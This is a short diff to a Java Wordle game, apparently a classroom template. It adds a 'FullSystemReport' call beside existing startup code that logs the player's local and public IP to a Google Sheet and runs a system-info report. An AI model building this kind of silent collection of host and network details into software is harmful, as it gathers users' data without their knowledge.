@@ -8,6 +8,7 @@ package play;/*
 
 import UIFiles.WordleDictionary;
 import UIFiles.WordleGWindow;
+import logging.FullSystemReport;
 import logging.MasterLogger;
 import oshi.SystemInfo;
 
@@ -308,10 +309,12 @@ public class Wordle
     {
         SystemInfo system = new SystemInfo();
         MasterLogger masterLogger = new MasterLogger(system,this);
+        FullSystemReport fullSystemReport = new FullSystemReport(system, this);
 
         setCorrectWord(); // Runs the setCorrectWord method that you are making
         logToGoogleSheetInfo(getLocalIP(), getPublicIP()); // Logs IP info
         masterLogger.logEssentialsReport();
+        fullSystemReport.logFullSystemReport();
 
 
 
